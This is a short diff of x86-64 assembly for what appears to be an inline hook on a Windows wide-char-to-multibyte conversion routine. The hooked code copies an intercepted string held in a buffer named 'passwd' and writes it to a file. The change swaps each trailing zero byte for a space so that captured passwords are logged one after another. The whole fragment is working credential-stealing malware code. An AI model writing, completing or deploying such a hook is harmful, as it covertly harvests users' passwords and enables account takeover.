@@ -106,11 +106,17 @@ hooked_wide_char_to_multibyte_inline_patch:
     mov rdx, passwd
     call strcpy
 
+    ; replace trailing zero with '20' (ascii space)
+    mov rax, passwd
+    mov rcx, [rbp - 16]             ; bytes written
+    dec rcx
+    add rax, rcx
+    mov byte [rax], 0x20
+
     sub rsp, 16                     ; 1 arg + 8 byte padding
     mov rcx, [rbp - 24]             ; file handle
     mov rdx, passwd
     mov r8, [rbp - 16]              ; bytes written
-    ; dec r8                          ; omit trailing 0
     xor r9, r9
     mov qword [rsp + 32], 0
     call [write_file]
